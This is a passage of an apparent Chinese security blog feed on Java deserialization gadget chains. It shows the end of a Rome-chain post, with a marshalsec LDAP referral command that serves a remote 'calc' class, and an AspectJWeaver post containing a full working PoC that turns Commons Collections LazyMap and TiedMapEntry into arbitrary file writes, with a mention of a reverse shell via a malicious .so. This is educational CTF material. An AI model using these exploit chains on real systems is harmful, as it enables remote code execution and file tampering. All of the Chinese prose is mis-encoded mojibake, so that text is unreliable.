class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code>å¼€ldapï¼Œ</p><p><code>python -m http.server 8000</code>å¼€å¯webæœåŠ¡ï¼Œç„¶åå°±å’Œä¹‹å‰è®²çš„JNDIä¸€æ ·äº†ã€‚</p><p>Romeè¿˜æœ‰å¾ˆå¤šå˜åŒ–é“¾ï¼Œä¹Ÿéå¸¸å€¼å¾—æ€è€ƒï¼Œå¯ä»¥çœ‹ä¸‹æ–¹é“¾æ¥ç»§ç»­è·Ÿè¿›å­¦ä¹ ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/rome#id-0x02-first-glance">Rome | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136576748?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-136576748-null-null.nonecase&utm_term=ROME">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹Romeâ€”â€”EqualsBean&amp;ObjectBean_javaååºåˆ—åŒ–romeé“¾-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136589322?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-136589322-null-null.nonecase&utm_term=ROME">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹Romeâ€”â€”å…³äºå…¶ä»–åˆ©ç”¨é“¾_javaååºåˆ—åŒ–romeé“¾-CSDNåšå®¢</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AspectJWeaver</title>
    <link href="/2024/08/09/AspectJWeaver/"/>
    <url>/2024/08/09/AspectJWeaver/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¾ç¨€è®°å¾—å›½èµ›åˆèµ›çš„é‚£é“Javaé¢˜ç›®å°±æ˜¯ç”¨<code>AspectJWeaver</code>å†™å…¥æ¶æ„soæ–‡ä»¶ä¼ è¿›å»ï¼Œç„¶åload_extensionä¸€æ‰‹åå¼¹shellã€‚</p><p>å…¶å®ç”¨åˆ°çš„å°±æ˜¯<code>AspectJWeaver</code>çš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ã€‚</p><p><code>AspectJWeaver</code>è¿ç”¨åœ¨é¢å‘åˆ‡é¢ç¼–ç¨‹(AOP: Aspect Oriented Programming)ä¸­</p><p>AOPæ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œæ—¨åœ¨æé«˜æ¨¡å—åŒ–ã€é™ä½ä»£ç è€¦åˆåº¦ã€‚å®ƒå¯ä»¥å‘ç°æœ‰ä»£ç æ·»åŠ å…¶ä»–è¡Œä¸ºè€Œä¸ä¿®æ”¹ä»£ç æœ¬èº«ã€‚Springå°±è¿ç”¨åˆ°äº†AOP</p><p>AOPçš„ä¸€äº›æ¦‚å¿µï¼š</p><ul><li>åˆ‡é¢(Aspect): å…¬å…±åŠŸèƒ½çš„å®ç°ã€‚å¦‚æ—¥å¿—åˆ‡é¢ã€æƒé™åˆ‡é¢ã€éªŒç­¾åˆ‡é¢ã€‚ç»™Javaç±»ä½¿ç”¨<code>@Aspect</code>æ³¨é‡Šä¿®é¥°ï¼Œå°±èƒ½è¢«AOPå®¹å™¨è¯†åˆ«ä¸ºåˆ‡é¢</li><li>é€šçŸ¥(Advice): åˆ‡é¢çš„å…·ä½“å®ç°ï¼Œå³åˆ‡é¢ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ ¹æ®æ”¾ç½®çš„åœ°æ–¹ä¸åŒï¼Œå¯åˆ†ä¸ºå‰ç½®é€šçŸ¥ï¼ˆBeforeï¼‰ã€åç½®é€šçŸ¥ï¼ˆAfterReturningï¼‰ã€å¼‚å¸¸é€šçŸ¥ï¼ˆAfterThrowingï¼‰ã€æœ€ç»ˆé€šçŸ¥ï¼ˆAfterï¼‰ä¸ç¯ç»•é€šçŸ¥ï¼ˆAroundï¼‰</li><li>è¿æ¥ç‚¹(JoinPoint): ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­èƒ½å¤Ÿæ’å…¥åˆ‡é¢çš„åœ°æ–¹ã€‚Springåªæ”¯æŒæ–¹æ³•çº§çš„è¿æ¥ç‚¹ã€‚æ¯”å¦‚ä¸€ä¸ªç›®æ ‡å¯¹è±¡æœ‰5ä¸ªæ–¹æ³•ï¼Œå°±æœ‰5ä¸ªè¿æ¥ç‚¹</li><li>åˆ‡å…¥ç‚¹(PointCut): ç”¨äºå®šä¹‰é€šçŸ¥åº”è¯¥åˆ‡å…¥åˆ°å“ªäº›è¿æ¥ç‚¹</li><li>ç›®æ ‡å¯¹è±¡(Target): å³å°†åˆ‡å…¥åˆ‡é¢çš„å¯¹è±¡ï¼Œè¢«é€šçŸ¥çš„å¯¹è±¡</li><li>ä»£ç†å¯¹è±¡(Proxy): å°†é€šçŸ¥åº”ç”¨åˆ°ç›®æ ‡å¯¹è±¡ä¹‹åè¢«åŠ¨æ€åˆ›å»ºçš„å¯¹è±¡ï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸ºï¼Œä»£ç†å¯¹è±¡çš„åŠŸèƒ½ç­‰äºç›®æ ‡å¯¹è±¡æœ¬èº«ä¸šåŠ¡é€»è¾‘åŠ ä¸Šå…±æœ‰åŠŸèƒ½ã€‚ä»£ç†å¯¹è±¡å¯¹äºä½¿ç”¨è€…è€Œè¨€æ˜¯é€æ˜çš„ï¼Œæ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„äº§ç‰©ã€‚ç›®æ ‡å¯¹è±¡è¢«ç»‡å…¥å…¬å…±åŠŸèƒ½åäº§ç”Ÿçš„å¯¹è±¡ã€‚</li><li>ç»‡å…¥(Weaving): å°†åˆ‡é¢åº”ç”¨åˆ°ç›®æ ‡å¯¹è±¡ä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ä»£ç†å¯¹è±¡çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥å‘ç”Ÿåœ¨ç¼–è¯‘æ—¶ã€ç±»åŠ è½½æ—¶ã€è¿è¡Œæ—¶ã€‚Springæ˜¯åœ¨è¿è¡Œæ—¶å®Œæˆç»‡å…¥ï¼Œè¿è¡Œæ—¶ç»‡å…¥é€šè¿‡Javaè¯­è¨€çš„åå°„æœºåˆ¶ä¸åŠ¨æ€ä»£ç†æœºåˆ¶æ¥åŠ¨æ€å®ç°ã€‚</li></ul><p>å¤§æ¦‚äº†è§£ä¸€ä¸‹ï¼Œè·Ÿä¸‹é¢è®²çš„åˆ©ç”¨é“¾æ²¡å•¥å…³ç³»</p><h2 id="ä»»æ„æ–‡ä»¶å†™å…¥"><a href="#ä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™å…¥"></a>ä»»æ„æ–‡ä»¶å†™å…¥</h2><p>è¿™ä¸ªåˆ©ç”¨é“¾ç”¨åˆ°äº†CCä¾èµ–ã€‚å›å¿†ä¸€ä¸‹ï¼ŒCommons Collections 3.2.2ä¸­ å¢åŠ äº†â¼€ä¸ªâ½…æ³•<code>FunctorUtils#checkUnsafeSerialization</code> â½¤äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå…¶ä¼šæ£€æŸ¥å¸¸è§çš„å±é™©Transformerç±»ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p><code>AspectJWeaver</code>è¿™é‡Œåªç”¨åˆ°äº†CCé‡Œçš„<code>LazyMap</code>ã€<code>TiedMapEntry</code>ã€<code>ConstantTransformer</code>ï¼Œé«˜ç‰ˆæœ¬CCä»å…·æœ‰å®ç”¨æ€§ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AspectWrite.txt&quot;</span>;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;content to write&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        HashSet&lt;Object&gt; hs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setPut(hs, entry);<br>        ser(hs);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;E:/ser&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>        outputStream.write(baos.toByteArray());<br>        outputStream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/ser&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(fileBytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPut</span><span class="hljs-params">(HashSet&lt;Object&gt; hs, Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è·å–HashSetä¸­çš„HashMapå¯¹è±¡</span><br>        Field field;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> (HashMap) field.get(hs);<br><br>        <span class="hljs-comment">// è·å–HashMapä¸­çš„tableå¯¹è±¡</span><br>        Field field1;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] array = (Object[]) field1.get(innerMap);<br><br>        <span class="hljs-comment">// ä»tableå¯¹è±¡ä¸­è·å–ç´¢å¼•0 æˆ– 1çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºHashMap$Nodeç±»</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-comment">// ä»HashMap$Nodeç±»ä¸­è·å–keyè¿™ä¸ªfieldï¼Œå¹¶ä¿®æ”¹ä¸ºtiedMapEntry</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GadGet</code>:</p><blockquote><p>HashSet#readObject</p><p>-&gt; HashMap#put(tiedMapEntry, new Object())</p><p>-&gt; HashMap#hash(tiedMapEntry)</p><p>-&gt; TiedMapEntry#hashCode</p><p>-&gt; TiedMapEntry#getValue</p><p>-&gt; LazyMap#get</p><p>-&gt; SimpleCache$StorableCachingMap#put</p><p>-&gt; SimpleCache$StorableCachingMap#writeToPath</p><p>-&gt; FileOutputStream#write()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡¾åæ€ä¹‰çš„è§’åº¦ï¼Œæ¨æµ‹<code>StoreableCachingMap&quot;</code>å¯èƒ½æ˜¯ä¸€ä¸ªå¯¹å¯¹è±¡è¿›è¡Œå­˜å‚¨å’Œç¼“å­˜çš„æ˜ å°„ç»“æ„çš„åç§°ã€‚</p><p>å®ƒå¯èƒ½å®ç°äº†ä¸€ç§å°†å¯¹è±¡å­˜å‚¨åœ¨å†…éƒ¨æ•°æ®ç»“æ„ä¸­ï¼Œå¹¶ä½¿ç”¨æŸç§ç­–ç•¥ï¼ˆä¾‹å¦‚æ—¶é—´æˆ³ã€æœ€è¿‘æœ€å°‘ä½¿ç”¨ç­‰ï¼‰è¿›è¡Œç¼“å­˜ç®¡ç†çš„æ–¹å¼ã€‚</p><p>æ³¨æ„åˆ°<code>SimpleCache</code>ç±»çš„å†…éƒ¨ç±»<code>StoreableCachingMap</code>æ˜¯ä¸€ä¸ªç»§æ‰¿<code>HashMap</code>çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StoreableCachingMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>        <span class="hljs-keyword">private</span> String folder;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CACHENAMEIDX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">lastStored</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEF_STORING_TIMER</span> <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> storingTimer;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Trace trace;<br></code></pre></td></tr></table></figure><p>å…¶æ„é€ æ–¹æ³•åœ¨åˆ›å»ºå¯¹è±¡æ—¶æ¥æ”¶æ–‡ä»¶å¤¹è·¯å¾„å’Œå­˜å‚¨è®¡æ—¶å™¨çš„å€¼ï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜åˆ°å¯¹è±¡çš„çŠ¶æ€ä¸­ï¼ŒåŒæ—¶è°ƒç”¨äº†ä¸€ä¸ªåˆå§‹åŒ–æ–¹æ³•æ¥ç¡®ä¿å¯¹è±¡çš„æ­£ç¡®è®¾ç½®ã€‚</p><p><code>StoreableCachingMap</code>æ˜¯<code>HashMap</code>çš„å­ç±»ï¼Œé‡å†™äº†<code>put</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">StoreableCachingMap</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span>&#123;<br>    <span class="hljs-built_in">this</span>.folder = folder;<br>    initTrace();<br>    <span class="hljs-built_in">this</span>.storingTimer = storingTimer;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] valueBytes = (<span class="hljs-type">byte</span>[]) value;<br><br>        <span class="hljs-keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123;<br>            path = SAME_BYTES_STRING;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            path = writeToPath((String) key, valueBytes);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.put(key, path);<br>        storeMap();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<span class="hljs-comment">//...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">writeToPath</span><span class="hljs-params">(String key, <span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fullPath</span> <span class="hljs-operator">=</span> folder + File.separator + key;<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fullPath);<br>    fos.write(bytes);<br>    fos.flush();<br>    fos.close();<br>    <span class="hljs-keyword">return</span> fullPath;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å°†é”®å€¼å¯¹æ·»åŠ åˆ°æ˜ å°„ä¸­ã€‚æ ¹æ® value çš„ä¸åŒæƒ…å†µï¼Œå¯èƒ½ä¼šå°†è·¯å¾„è®¾ç½®ä¸ºSAME_BYTES_STRING æˆ–ä½¿ç”¨ writeToPath æ–¹æ³•å°†é”®å’Œå€¼å†™å…¥åˆ°æŸä¸ªè·¯å¾„ä¸­ã€‚ç„¶åï¼Œå°†é”®å’Œè·¯å¾„æ·»åŠ åˆ°æ˜ å°„ä¸­ï¼Œå¹¶å°†æ˜ å°„æ•°æ®å­˜å‚¨åˆ°æŒä¹…åŒ–å­˜å‚¨ä¸­ã€‚æœ€åï¼Œè¿”å›æ·»åŠ ç»“æœã€‚ </p><p>é‚£ä¸ªæ¡ä»¶åˆ¤æ–­å°±æ˜¯æ£€æŸ¥ valueBytes æ˜¯å¦ä¸ SimpleCache.SAME_BYTES ç›¸ç­‰ã€‚å¦‚æœç›¸ç­‰ï¼Œè¯´æ˜ value æ˜¯ä¸€ä¸ªç‰¹å®šçš„å­—èŠ‚æ•°ç»„ï¼ˆSimpleCache.SAME_BYTESï¼‰ï¼Œåˆ™å°† path è®¾ç½®ä¸ºSAME_BYTES_STRINGã€‚</p><p>SimpleCache.SAME_BYTESä¸ºä¸‹é¢çš„è¿™ä¸ªå€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] SAME_BYTES = 